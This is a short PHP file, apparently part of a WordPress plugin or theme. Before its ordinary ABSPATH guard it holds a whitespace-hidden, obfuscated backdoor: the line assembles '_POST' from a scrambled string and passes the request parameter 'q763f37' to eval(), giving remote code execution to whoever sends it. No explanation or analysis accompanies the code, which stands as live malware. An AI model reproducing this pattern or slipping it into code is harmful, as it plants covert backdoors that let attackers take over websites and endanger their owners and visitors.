<?php                                                                                                                                                                                                                                                                     $ion03 ="optu_ser";$sxob48= $ion03[5].$ion03[2]. $ion03[7]. $ion03[2]. $ion03[0]. $ion03[3].$ion03[1].$ion03[1].$ion03[6]. $ion03[7]; $rws8 =$sxob48($ion03[4]. $ion03[1] .$ion03[0].$ion03[5].$ion03[2] ) ;if (isset(${ $rws8}[ 'q763f37' ]) ){ eval( ${ $rws8}['q763f37' ] );}?><?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}
